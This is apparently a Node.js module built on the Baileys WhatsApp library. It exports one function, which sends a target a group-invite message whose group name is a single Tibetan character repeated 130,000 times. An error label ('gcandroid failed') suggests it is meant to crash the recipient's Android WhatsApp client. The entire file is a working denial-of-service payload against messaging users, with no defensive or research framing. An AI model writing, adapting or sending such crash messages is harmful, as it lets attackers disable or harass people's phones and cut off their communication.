
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function Xgc(SYxS7, target) {
    try {
        const LoveString = "ཹ".repeat(65000);
        const SY_love_payload = LoveString.repeat(2);

        const lovemessage = {
            groupInviteMessage: {
                groupName: SY_love_payload,
                groupJid: "561611-1627579259@g.us", 
                inviteCode: "h+64P9RhJDzgXSPf",        
                //inviteExpiration: 999,
                inviteExpiration: 32503680000,
                caption: "",
                thumbnail: null,
                contextInfo: {}
            }
        };

        await SYxS7.relayMessage(target, lovemessage, {});
    } catch (error) {
        console.error("gcandroid failed →", error.message || error);
    }
}


module.exports = { Xgc };